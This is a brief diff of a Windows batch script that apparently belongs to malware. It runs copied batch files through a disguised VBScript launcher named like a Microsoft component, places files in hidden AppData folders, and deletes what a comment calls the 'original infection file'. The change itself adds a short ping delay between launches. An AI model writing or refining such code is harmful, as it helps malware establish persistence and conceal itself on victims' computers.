@@ -202,6 +202,7 @@ del C:\Users\%username%\Downloads\startup_copier2.bat
 
 
 wscript.exe C:\Users\%username%\AppData\Roaming\Microsoft\msdfmap.vbs C:\Users\%username%\AppData\Roaming\startup_copier2.bat
+ping -n 3 127.0.0.1 > nul
 wscript.exe C:\Users\%username%\AppData\Roaming\Microsoft\msdfmap.vbs C:\Users\%username%\AppData\Roaming\Microsoft\msdfmap.bat
 
 REM Deletes original infection file.
